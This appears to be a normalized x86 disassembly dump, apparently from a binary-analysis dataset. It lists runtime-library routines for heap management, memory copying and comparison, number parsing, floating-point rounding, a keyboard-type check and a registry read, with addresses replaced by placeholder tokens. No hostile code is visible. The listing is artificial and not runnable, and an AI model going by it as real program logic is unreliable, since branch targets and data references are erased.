xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401efc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401eb0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401430
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cd0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d40
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c54
sub [ edi + 0x4 ] 0x4
sub_401f88
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017dc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401efc
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fb4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40186c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401efc
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fe8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402014
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bc0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e28
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f88
test al al
jne r-xdata
mov eax esi
call sub_401fe8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402108
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a1c
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402284
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401378
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_402014
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401380
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a08
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a08
jmp r-xdata
sub_402298
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40242a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a1c
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401378
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401380
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403a08
jmp r-xdata
call sub_401eb0
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bc0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e28
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bc0
sub_40243c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401eb0
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bc0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fb4
test al al
je r-xdata
call sub_401bc0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c84
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e28
jmp r-xdata
sub_402618
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026c9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a1c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40243c
test al al
je r-xdata
push rw-data
call sub_401378
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402108
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028d8
mov eax ebx
call sub_402298
retn
push rw-data
call sub_401380
sub_4026dc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402838
sub_4026fc
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402838
sub_40271c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402838
mov [ ecx ] eax
mov al 0x2
jmp sub_402838
retn
mov [ ecx ] eax
retn
sub_4027ac
push ebx
push esi
call sub_405ebc
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405ebc
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405ebc
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027ec
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405ebc
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027e0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402874
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028d8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_40293c
fld st0
sub esp 0x4
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
frndint
fwait
fldcw [ esp ]
add esp 0x4
fsubp st1
retn
sub_40296c
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_4029ac
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402864
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402a00
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402864
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402864
jmp r-xdata
sub_402a58
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402a94
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028d8
pop ebx
retn
mov ecx ebx
sub_402ab0
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402b34
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402ba4
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402bc4
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402ca4
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402ce4
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d97 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d97 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402d97
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_402fd0
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_403000
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012d4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403071
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012cc
retn
sub_4030f4
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_40319c
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4031f4
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404950
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_403214
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4057a4
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403244
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4032c8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4032d8
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4032cf
lea eax [ ebp - 0x8 ]
call sub_40578c
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_403214
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4057a4
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4032d8
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_40331c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_4033bc
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40335c
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_40338c
push eax
push ecx
mov eax [ eax ]
call sub_40335c
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f14
call [ rw-data ]
sub_4033a4
push esi
mov esi edx
mov eax [ eax ]
call sub_40335c
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f14
call [ rw-data ]
sub_4033ec
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_40335c
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_403414
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
